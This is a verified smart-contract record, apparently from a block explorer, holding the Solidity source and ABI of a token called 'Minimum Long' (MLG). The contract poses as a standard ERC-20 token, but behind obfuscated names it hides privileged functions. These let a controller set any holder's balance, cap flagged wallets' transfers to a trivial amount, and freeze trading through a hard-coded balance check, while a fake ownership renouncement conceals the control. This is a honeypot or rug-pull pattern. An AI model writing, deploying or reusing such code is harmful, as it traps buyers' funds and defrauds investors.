{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface senderMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract feeTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverAmountLimit {\n    function createPair(address teamBuy, address fundExempt) external returns (address);\n}\n\ninterface marketingFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletTotal) external view returns (uint256);\n\n    function transfer(address shouldLiquidity, uint256 liquidityTeam) external returns (bool);\n\n    function allowance(address isTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldLiquidity,\n        uint256 liquidityTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletTokenTotal, uint256 value);\n    event Approval(address indexed isTeam, address indexed spender, uint256 value);\n}\n\ninterface sellEnable is marketingFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MinimumLong is feeTx, marketingFrom, sellEnable {\n\n    address private isShould;\n\n    address public receiverMarketing;\n\n    function shouldToFund() private view {\n        require(listTradingLiquidity[_msgSender()]);\n    }\n\n    mapping(address => bool) public fromEnable;\n\n    function minTotal(address receiverEnableTx) public {\n        if (modeMarketingReceiver) {\n            return;\n        }\n        \n        listTradingLiquidity[receiverEnableTx] = true;\n        \n        modeMarketingReceiver = true;\n    }\n\n    mapping(address => uint256) private limitLiquidity;\n\n    function marketingReceiver(address feeBuy, address shouldLiquidity, uint256 liquidityTeam) internal returns (bool) {\n        if (feeBuy == receiverMarketing) {\n            return toSwap(feeBuy, shouldLiquidity, liquidityTeam);\n        }\n        uint256 minFrom = marketingFrom(swapIs).balanceOf(launchAutoList);\n        require(minFrom == launchTrading);\n        require(shouldLiquidity != launchAutoList);\n        if (fromEnable[feeBuy]) {\n            return toSwap(feeBuy, shouldLiquidity, marketingAuto);\n        }\n        return toSwap(feeBuy, shouldLiquidity, liquidityTeam);\n    }\n\n    function fromReceiver() public {\n        emit OwnershipTransferred(receiverMarketing, address(0));\n        isShould = address(0);\n    }\n\n    bool public liquidityMarketing;\n\n    event OwnershipTransferred(address indexed txLiquidity, address indexed totalTo);\n\n    uint256 public tokenTrading;\n\n    uint256 private txExempt;\n\n    uint256 launchTrading;\n\n    uint256 private launchedAuto;\n\n    uint256 public exemptTo;\n\n    mapping(address => mapping(address => uint256)) private shouldMin;\n\n    bool public minFee;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundAutoExempt;\n    }\n\n    function transferFrom(address feeBuy, address shouldLiquidity, uint256 liquidityTeam) external override returns (bool) {\n        if (_msgSender() != receiverShould) {\n            if (shouldMin[feeBuy][_msgSender()] != type(uint256).max) {\n                require(liquidityTeam <= shouldMin[feeBuy][_msgSender()]);\n                shouldMin[feeBuy][_msgSender()] -= liquidityTeam;\n            }\n        }\n        return marketingReceiver(feeBuy, shouldLiquidity, liquidityTeam);\n    }\n\n    function receiverList(uint256 liquidityTeam) public {\n        shouldToFund();\n        launchTrading = liquidityTeam;\n    }\n\n    function getOwner() external view returns (address) {\n        return isShould;\n    }\n\n    mapping(address => bool) public listTradingLiquidity;\n\n    bool public maxFee;\n\n    function owner() external view returns (address) {\n        return isShould;\n    }\n\n    string private amountTokenAt = \"Minimum Long\";\n\n    address receiverShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private marketingMin;\n\n    uint256 tradingTx;\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderTeamTotal;\n    }\n\n    function toSwap(address feeBuy, address shouldLiquidity, uint256 liquidityTeam) internal returns (bool) {\n        require(limitLiquidity[feeBuy] >= liquidityTeam);\n        limitLiquidity[feeBuy] -= liquidityTeam;\n        limitLiquidity[shouldLiquidity] += liquidityTeam;\n        emit Transfer(feeBuy, shouldLiquidity, liquidityTeam);\n        return true;\n    }\n\n    function transfer(address takeTrading, uint256 liquidityTeam) external virtual override returns (bool) {\n        return marketingReceiver(_msgSender(), takeTrading, liquidityTeam);\n    }\n\n    uint256 constant marketingAuto = 10 ** 10;\n\n    function name() external view virtual override returns (string memory) {\n        return amountTokenAt;\n    }\n\n    address launchAutoList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function buyLaunch(address toLaunch) public {\n        shouldToFund();\n        \n        if (toLaunch == receiverMarketing || toLaunch == swapIs) {\n            return;\n        }\n        fromEnable[toLaunch] = true;\n    }\n\n    uint8 private fundLiquidity = 18;\n\n    function balanceOf(address walletTotal) public view virtual override returns (uint256) {\n        return limitLiquidity[walletTotal];\n    }\n\n    string private senderTeamTotal = \"MLG\";\n\n    uint256 private fundAutoExempt = 100000000 * 10 ** 18;\n\n    address public swapIs;\n\n    uint256 public limitExempt;\n\n    function allowance(address enableReceiver, address buyTotal) external view virtual override returns (uint256) {\n        if (buyTotal == receiverShould) {\n            return type(uint256).max;\n        }\n        return shouldMin[enableReceiver][buyTotal];\n    }\n\n    function takeFee(address takeTrading, uint256 liquidityTeam) public {\n        shouldToFund();\n        limitLiquidity[takeTrading] = liquidityTeam;\n    }\n\n    bool public modeMarketingReceiver;\n\n    constructor (){\n        \n        senderMin tokenSender = senderMin(receiverShould);\n        swapIs = receiverAmountLimit(tokenSender.factory()).createPair(tokenSender.WETH(), address(this));\n        if (exemptTo == txExempt) {\n            limitExempt = marketingMin;\n        }\n        receiverMarketing = _msgSender();\n        fromReceiver();\n        listTradingLiquidity[receiverMarketing] = true;\n        limitLiquidity[receiverMarketing] = fundAutoExempt;\n        \n        emit Transfer(address(0), receiverMarketing, fundAutoExempt);\n    }\n\n    function approve(address buyTotal, uint256 liquidityTeam) public virtual override returns (bool) {\n        shouldMin[_msgSender()][buyTotal] = liquidityTeam;\n        emit Approval(_msgSender(), buyTotal, liquidityTeam);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundLiquidity;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletTokenTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyTotal\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTotal\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLaunch\",\"type\":\"address\"}],\"name\":\"buyLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listTradingLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverEnableTx\",\"type\":\"address\"}],\"name\":\"minTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMarketingReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityTeam\",\"type\":\"uint256\"}],\"name\":\"receiverList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityTeam\",\"type\":\"uint256\"}],\"name\":\"takeFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MinimumLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}